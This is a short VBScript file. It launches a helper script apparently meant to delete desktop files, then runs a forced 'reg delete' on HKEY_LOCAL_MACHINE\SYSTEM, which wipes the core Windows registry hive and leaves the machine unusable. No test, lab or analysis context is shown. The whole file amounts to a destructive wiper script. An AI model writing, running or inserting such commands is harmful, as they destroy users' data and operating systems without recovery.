Set shell = CreateObject("Wscript.shell")

Set FSO = CreateObject("Scripting.FileSystemObject")

Set network = CreateObject("WScript.Network")

user = network.UserName

desktop = shell.SpecialFolders("Desktop")

deleteDesktopFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help\delDesktop.vbs"

shell.run deleteDesktopFilePath, 1, True

shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 1, True
